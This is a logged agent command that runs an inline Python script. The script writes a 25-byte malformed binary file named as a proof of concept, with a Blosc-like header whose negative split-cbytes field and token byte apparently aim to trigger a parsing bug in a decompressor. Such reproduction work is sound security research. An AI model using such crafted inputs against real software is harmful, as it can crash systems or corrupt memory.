Running command: cd /workspace && python3 - <<'PY'
import struct
p=bytearray()
p += bytes([2,1,0,1])
p += struct.pack('<i',1)  # nbytes
p += struct.pack('<i',1)  # blocksize
p += struct.pack('<i',25) # cbytes total
p += struct.pack('<i',20) # bstart
p += struct.pack('<i',-1) # split cbytes negative
p += b'\x00'             # token with run bit clear leaves nbytes unset
assert len(p)==25
open('/workspace/poc_neg_cbytes_token0.bin','wb').write(p)
PY
